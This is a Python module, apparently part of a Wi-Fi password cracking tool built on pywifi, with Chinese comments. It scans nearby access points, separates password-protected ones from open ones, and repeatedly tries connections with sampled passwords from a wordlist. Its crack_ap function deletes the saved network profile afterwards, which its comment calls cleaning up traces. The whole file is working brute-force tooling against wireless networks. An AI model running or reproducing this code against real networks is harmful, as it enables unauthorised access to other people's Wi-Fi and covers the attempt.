import time
import math
import random

from pywifi import const  # 引用一些定义

__all__ = [
    'get_aps', 'classify_aps', 'crack_ap', 'sample_passwords'
]


def get_aps(iface, count=None, filtered_ssids=None):
    """
    获取信号强度靠前的count个信号的ssid
    """
    if filtered_ssids is None:
        filtered_ssids = []

    iface.scan()
    time.sleep(8)
    profiles = iface.scan_results()

    filtered_profiles = list(
        filter(lambda profile: profile.ssid not in filtered_ssids, profiles))
    filtered_profiles.sort(key=lambda p: p.signal, reverse=True)

    if count:
        return filtered_profiles[:count]
    else:
        return filtered_profiles


def classify_aps(profiles):
    """
    将热点分为需要密码和不需要密码两类
    """
    needpwd, notneedpwd = [], []

    for profile in profiles:
        if const.AKM_TYPE_NONE in profile.akm:
            notneedpwd.append(profile)
        else:
            needpwd.append(profile)

    return needpwd, notneedpwd


def crack_ap(iface, profile):
    """
    使用密码key来测试名称为ssid的热点能否连接上
    """
    iface.disconnect()  # 断开无限网卡连接
    time.sleep(1)

    ssid = profile.ssid

    # 网卡断开链接后开始连接测试
    if iface.status() == const.IFACE_DISCONNECTED:
        try:
            iface.add_network_profile(profile)
            iface.connect(profile)

            # wifi连接时间
            time.sleep(2)
            return iface.status() == const.IFACE_CONNECTED

        except:
            raise

        finally:
            # 清理痕迹，直接使用iface.remove_network_profile(profile)会出现问题
            network_profiles = iface.network_profiles()
            for network_profile in network_profiles:
                if network_profile.ssid == ssid:
                    iface.remove_network_profile(network_profile)
                    

    else:
        return None


def sample_passwords(passwords, stype):
    """
    密码本采样类型：
    0: 完全复制密码本
    1: 提取前200个密码
    2: 随机采取sqrt(length)个密码
    3: 提取前200个密码+随机采取sqrt(remaining_length)个密码
    """
    if stype == 1:
        if len(passwords) < 200:
            return passwords.copy()
        else:
            return passwords[:200]
    elif stype == 2:
        return random.sample(passwords, int(math.sqrt(len(passwords))))
    elif stype == 3:
        if len(passwords) < 200:  # 起始的200个被认为是具有较高可能性的密码
            p_passwords = passwords
            r_passwords = []
        else:
            p_passwords = passwords[:200]
            r_passwords = passwords[200:]
        return p_passwords + \
            random.sample(r_passwords, int(math.sqrt(len(r_passwords))))
    else:
        return passwords.copy()
